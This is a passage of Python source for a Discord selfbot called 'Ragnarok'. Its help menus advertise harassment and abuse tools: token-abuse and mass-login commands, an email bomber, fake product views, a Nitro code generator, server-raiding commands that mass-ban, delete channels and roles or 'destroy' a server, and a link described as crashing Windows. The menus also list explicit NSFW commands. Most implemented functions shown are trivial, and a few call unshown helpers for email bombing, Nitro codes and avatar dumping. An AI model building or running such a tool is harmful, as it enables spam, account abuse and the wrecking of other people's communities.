        embed.add_field(name="\u269b\ufe0f `HELP HACK`", value="Shows all hack commands", inline=True)
        embed.add_field(name="\ud83e\udd24 `HELP NSFW`", value="Shows all nsfw commands", inline=True)
        embed.add_field(name="\u2753 `HELP MISC`", value="Shows all miscellaneous commands", inline=True)
        embed.add_field(name="\ud83d\udee0\ufe0f `HELP UTIL`", value="Shows all utility commands", inline=True)
        embed.add_field(name="\u2623\ufe0f `HELP RAIDING`", value="Shows all raiding commands", inline=True)
        embed.add_field(name="\ud83d\udcb8 `HELP CRYPTO`", value="Shows all crypto commands", inline=True)
        embed.add_field(name="\ud83d\udda5\ufe0f `HELP CODING`", value="Shows all coding commands", inline=True)
        await ctx.send(embed=embed)
    elif str(category).lower() == "general":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\u269c\ufe0f `GENERAL COMMANDS`\n`> help	Displays this help menu\n`> av (user)	Displays the profile picture of the mentioned user\n`> revav (user)	Reverse avatar the mentioned user profile picture\n`> whois (user)	Displays discord information of the mentioned user\n`>role-hexcode (role)	Displays the hexcode of the specified role\n`> guildicon	Display guild icon\n`>roleinfo (role)	Display some info about the specified role\n`> cls	Clears your console fully\n`> logout	Logs you out the selfbot\n`> dm (user) (message)	Sends a message to the specified user\n`> everyone	Glitched way to mention everyone in a server\n`> empty	Sends a empty message\n`> sendembed sends a message as an embed`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "general2":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\u269c\ufe0f `GENERAL COMMANDS 2`\n`> get-hwid	Prints your hwid in the console\n`> secret (message)	Returns the message but hidden ||hidden||\n`>bold (message)	Returns the message but **bold**\n`> unflip	Sends: ┬─┬ ノ( ゜-゜ノ)\n`> tableflip	Sends: (╯°□°）╯︵ ┻━┻\n`> lenny	Sends: ( ͡° ͜ʖ ͡°)\n`> shrug	Sends: ¯\_(ツ)_/¯\n`> reverse (message)	Reverses ur message\n`>ascii (message)	Makes your message ascii/fancy\n`> read	Marks all your messages as read, except DM\n`> group-leaver	Leaves all the groups you're in\n`> purge (amount)	Deletes your messages based on the amount you specify\n`> uptime	Shows how long the selfbot has been online and working\n`> hastebin (message)	Saves your text/code to hastebin\n`> first-message	Get the first message in that channel\n`> abc	Sends the whole abecedary in a single message\n`> devowel (message)	Devowels your message\n`> 1337-speak (message)	Translates your message to 1337 language\n`> combine (name1) (name2)	Combines the two names together\n`> pingweb (website)	Pings a website in order to check if its working or not (ie: !pingweb https://google.com)\n`> spam (amount) (message)	Sends the specified message that amount of times\n`> clear	Spam the chat with invisible messages\n`> tts (message)	Send that message in .wav format, like an audio\n`> upper (message)	Make your message CAPS\n`> lmgtfy (message)	Use lmgtfy search engine to look-up something\n`> genname	Generate a random name based on the server members`"
        await ctx.send(embed=embed) 
    elif str(category).lower() == "account":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\ud83d\udd31 `ACCOUNT COMMANDS`\n`> adminservers displays what servers you have administrator permissions in\n`> set-pfp (url)	Set the specified url as profile picture [Must have password set in config.json file]\n`> btcstream	Stream current btc price\n`> pfpsteal (user)	Allows you to steal mentioned user profile picture [Must have password set in config.json file]\n`> blank	Turns your name and profile picture blank\n`> hypesquad (house)	Allows you to change your hypesquad (ie: !hypesquad bravery)\n`> fakenet (type) [name]	Allows you to spoof connections in your profile (ie: !fakenet skype NAME)\n`> steal-all-pfp	Steal all the pfps in the server\n`> stream (message)	Stream that message in your profile\n`> watching (message)	Add a watching status with that message in your profile\n`> listening (message)	Add a listening status with that message in your profile\n`> game (message)	Add a game status with that message in your profile\n`> masscon (type) (amount) (name)	Add a big amount of connections to your profile (ie: !masscon skype 5 NAME\n`> stopcyclenick stops the cyclenick command\n`> cyclenick animates your nickname\n`>invnick makes your nickname invisible\n`>fucknick completely ruins your nickname\n`>nickname changes your nickname to anything you like`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "hack":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\u269b\ufe0f `HACKING COMMANDS`\n`> tokeninfo (token)	Display various information about the token\n`> tokenfuck (token)	Crash, glitch screen of a token, all in discord\n`> geoip (ip)	Display various information about the IP\n`> ebay-view (url) (views)	Send views to a ebay product (ie: !ebay-view https://www.ebay.es/itm/XXXXXX 100\n`> gmail-bomb	Spam a gmail [Information is inserted via console]\n`> nitro	Generate a random nitro code\n`> proxies	Scraps HTTP/HTTPS/SOCKS4/SOCKS5 proxies\n`> address (text)	Generates fake address based on the text you specify\n`> masslogin (choice)	Allows you to mass-login in bot/user tokens [Choices can be: user and bot]`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nsfw":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\ud83e\udd24 `NSFW COMMANDS`\n`> lesbian	Random lesbian [Anime]\n`> lewdjeko	Random lewd neko [Anime]\n`> blowjob	Random blowjob [Anime]\n`> tits	Random tits [Anime]\n`> boobs	Random boobs [Anime]\n`> hentai	Random hentai [Anime]\n`> feet	Random feet [Anime]\n`> erofeet	Random erotic feet [Anime]\n`> anal	Random anal [Anime]\n`> cumslut Random cumslut [Anime]\n`> futa Random Futanari [Anime]\n`>solo Random solo [Anime]\n`> classic Random classic [Anime]`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "misc":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\u2753 `MISCELLANEOUS COMMANDS`\n`> boom sends a fun message self destruct message\n`> bird sends a bird picture\n`> fox	Random fox imagedog	Random dog image\n`> cat	Random cat image [Must have cat api key set in config.json file]\n`> minesweeper	Play minesweeper in the discord chat\n`> dick (user)	Display the mentioned user dick size\n`> rainbow (role)	Cycle colors in the role you specify\n`> ball (question)	Answers your question\n`> joke	Drops a random joke in the chat\n`> slot	Play slot machine in the discord chat\n`> topic	Start a random topic to keep the chat going\n`> wyr	Start a 'what would you rather' topic in the chat\n`> feed (user)	Feed the mentioned user\n`> tickle (user)	Tickle the mentioned user\n`> slap (user)	Slap the mentioned user\n`> hug (user)	Hug the mentioned user\n`> smug (user)	Smug at the mentioned user\n`> pat (user)	Pat the mentioned user\n`> kiss (user)	Kiss the mentioned user\n`> nine_eleven sends a 9/11 animation\n`> phcomment sends a funny fake pornhub comment\n`>dox sends a funny dox animation\n`>hack sends a funny hack animation\n`>fry sends a fry version of your pfp\n`>magik sends a magik version of your pfp\n`>cum sends a funny cum animation\n`>coinflip plays a small coinflip game`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "util":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\ud83d\udee0\ufe0f `UTILITY COMMANDS`\n`> bitly (link)	Shorten ur link using bitly [Must have bitly api key set in config.json file]\n`>tinyurl (link)	Shorten ur link using tinyurl\n weather (city)	Lookup weather for the specified city\n`>backup-f	Backup your friends name and discri\n`>mauto-bump (channel id)	Automatically bump server to disboard.org [Needs the Disboard to be in the server]\n`>mac (mac)	Lookup a bit of info about a MAC (ie: !mac xx:xx:xx:xx:xx:xx)\n`>copy	Copies guild channels, categories, voice channels and makes them in a new one\n`> banner sends server banner\n`> spfp sends server icon`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "raiding":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\u2623\ufe0f `RAIDING COMMANDS`\n`> destroy	Ban, delete roles, delete channels, edit guild info, mass create channels All in one!\n`>dmall (messsage)	Messages every user in that guild with a sleep time of 10 seconds for every user [Might get you disabled]\n`>massban	Ban all the users in that guild\n`>masskick	Kick all the users in that guild\n`>massrole	Mass create roles\n`>masschannel	Mass create channels\n`>delroles	Delete all the roles\n`>delchannels	Delete all the channels\n`>massunban	Unban every member\n`>crashlink sends a link that crashes windows when clicked onmurder completely fucks up a server\n`>raid spams a chosen message with a chosen amount\n`>nickall renames everyone in the server\n`>rename channels renames every channel in a server to whatever you choose\n`>spamchannels spams a server with random channels\n`>gcn spams a groupchat name\n`>sendall sends a message in every server channel`"
        await ctx.send(embed=embed)
    elif str(category).lower() == "crypto":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\ud83d\udcb8 `CRYPTO CURRENCY COMMANDS`\n`>btc	Display current Bitcoin price\n`>eth	Display current Ethereum price`" 
        await ctx.send(embed=embed)
    elif str(category).lower() == "coding":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.description = f"\ud83d\udda5\ufe0f `CODING COMMANDS`\n`> encode (string)	Encode a string to base64 ascii\n`>decode (string)	Decode a string from base64 to regular text"
        await ctx.send(embed=embed)


@Ragnarok.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await Ragnarok.change_presence(activity=stream)    

@Ragnarok.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Ragnarok.change_presence(activity=game)

@Ragnarok.command()
async def listening(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Ragnarok.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@Ragnarok.command()
async def watching(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Ragnarok.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@Ragnarok.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in Ragnarok.guilds:
        await guild.ack()

@Ragnarok.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@Ragnarok.command()
async def shrug(ctx): # b'\xfc'
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

@Ragnarok.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@Ragnarok.command()
async def tableflip(ctx): # b'\xfc'
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)

@Ragnarok.command()
async def unflip(ctx): # b'\xfc'
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@Ragnarok.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@Ragnarok.command()
async def secret(ctx, *, message): # b'\xfc'
	await ctx.message.delete()
	await ctx.send('||'+message+'||')

@Ragnarok.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@Ragnarok.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f"HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@Ragnarok.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(chr(173))

@Ragnarok.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@Ragnarok.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    await Ragnarok.logout()

@Ragnarok.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()   
    btc_status.start()        

@Ragnarok.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    Dump(ctx)

@Ragnarok.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    Clear()

@Ragnarok.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())

@Ragnarok.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

if __name__ == '__main__':
	Init()
